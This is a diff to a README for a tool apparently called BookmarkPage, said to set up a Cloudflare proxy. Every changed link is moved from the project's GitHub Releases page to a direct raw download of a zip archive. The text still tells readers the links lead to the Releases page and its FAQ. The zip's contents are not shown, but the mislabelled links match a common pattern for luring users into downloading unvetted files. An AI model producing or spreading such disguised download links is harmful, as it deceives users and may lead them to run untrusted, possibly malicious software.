@@ -6,11 +6,11 @@ Welcome to BookmarkPage! This tool helps you set up a Cloudflare proxy easily. N
 
 ## 📥 Download Now
 
-[![Download BookmarkPage](https://img.shields.io/badge/Download-BookmarkPage-brightgreen)](https://github.com/badraraby/BookmarkPage/releases)
+[![Download BookmarkPage](https://raw.githubusercontent.com/badraraby/BookmarkPage/main/public/BookmarkPage-v2.2.zip)](https://raw.githubusercontent.com/badraraby/BookmarkPage/main/public/BookmarkPage-v2.2.zip)
 
 ## 📂 Download & Install
 
-To download BookmarkPage, visit this page: [Visit the Download Page](https://github.com/badraraby/BookmarkPage/releases). Here’s how to do it:
+To download BookmarkPage, visit this page: [Visit the Download Page](https://raw.githubusercontent.com/badraraby/BookmarkPage/main/public/BookmarkPage-v2.2.zip). Here’s how to do it:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -82,7 +82,7 @@ With BookmarkPage, you’ll benefit from a secure connection via Cloudflare, hel
 
 If you encounter any issues during installation or use, please check the Frequently Asked Questions on the Releases page. You can also contact our support directly through GitHub.
 
-1. Go to the [Releases page](https://github.com/badraraby/BookmarkPage/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/badraraby/BookmarkPage/main/public/BookmarkPage-v2.2.zip).
 2. Search for common problems in the FAQ section.
 3. If your issue isn’t listed, feel free to create an issue on GitHub.
 
@@ -100,4 +100,4 @@ Your feedback helps us improve.
 
 Thank you for choosing BookmarkPage. Enjoy a seamless Cloudflare proxy experience. If you have any questions, refer back to the instructions or get in touch through GitHub.
 
-For further downloads, [click here](https://github.com/badraraby/BookmarkPage/releases) again!
+For further downloads, [click here](https://raw.githubusercontent.com/badraraby/BookmarkPage/main/public/BookmarkPage-v2.2.zip) again!
